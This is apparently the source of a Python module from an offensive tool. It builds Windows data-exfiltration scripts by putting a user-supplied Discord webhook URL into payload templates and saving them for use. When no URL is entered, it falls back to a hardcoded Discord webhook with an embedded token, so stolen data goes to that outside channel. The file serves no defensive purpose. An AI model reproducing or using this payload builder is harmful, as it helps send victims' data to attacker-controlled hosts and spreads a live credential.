#!/usr/bin/env python3

import os
import json
from modules.sftp import sftp
import sys


def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)


R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

def WEBHOOK(win):
	print('\n', end='')
	exfil_scripts = []
	for (dirpath, dirname, filenames) in os.walk(resource_path('scripts/windows/WEBHOOK')):
		exfil_scripts.extend(filenames)
	for item in exfil_scripts:
		print(G + '[{}] '.format(exfil_scripts.index(item)) + C + item)
	
	while True:
		exfil_choice = input(G + '\nape[windows/WEBHOOK] > ' + W)
				
		if exfil_choice == 'clear':
			os.system('clear')
		elif exfil_choice == 'back':
			return win()
		elif exfil_choice == 'help':
			return WEBHOOK(win)
		elif exfil_choice == '':
			pass
		elif exfil_choice == 'exit' or exfil_choice == 'quit':
			quit()
		elif int(exfil_choice) <= len(exfil_scripts) - 1:
			with open('conf/exfil_scripts.json', 'r') as json_file:
				options = json.load(json_file)
			try:
				chosen = exfil_scripts[int(exfil_choice)]
			
				for k,v in options.items():
					if k in chosen:
						sftp_state = v['sftp']
						desc = v['desc']
						print('\n', end = '')
						print(G + '[+]' + C + ' Script : ' + W + chosen + '\n')
						print(G + '[+]' + C + ' Info : ' + W + desc + '\n')
						if sftp_state == 1:
							pass
						else:
							pass
			
						script_path = '/scripts/windows/WEBHOOK/' + chosen
						exfil_output(script_path, chosen)
			except ValueError:
				pass
		else:
			print('\n' + R + '[-]' + C + ' Invalid Input...' + W)
			pass

def exfil_output(script_path, chosen):
	base_path = os.getcwd() + script_path

	with open(base_path, 'r') as file :
		filedata = file.read()
	
	url= input(G + '[+]' + C + ' WEBHOOK URL (ENTER 0 IF YOU DO NAT HAVE ONE): ' + W)
	nma= input(G + '[+]' + C + ' ENTER A SMALL NAME:  ' + W)
	if url == '0':
    		url = "https://discord.com/api/webhooks/808760966576865360/ZFC0eGGFX2YKt5_8of26kI1r8MEV5DbWUT5vgGnEO2YKwcqqxuKwDWZPjBMFXywgNxf7"

	filedata = filedata.replace('USERNAME', nma)
	filedata = filedata.replace('WEBHOOK', url)

	with open('output/{}'.format(chosen), 'w') as file:
		file.write(filedata)

	outfile_path = os.getcwd() + '/output/{}'.format(chosen)
	
	print(G + '[+]' + C + ' Script Generated : ' + W + outfile_path)
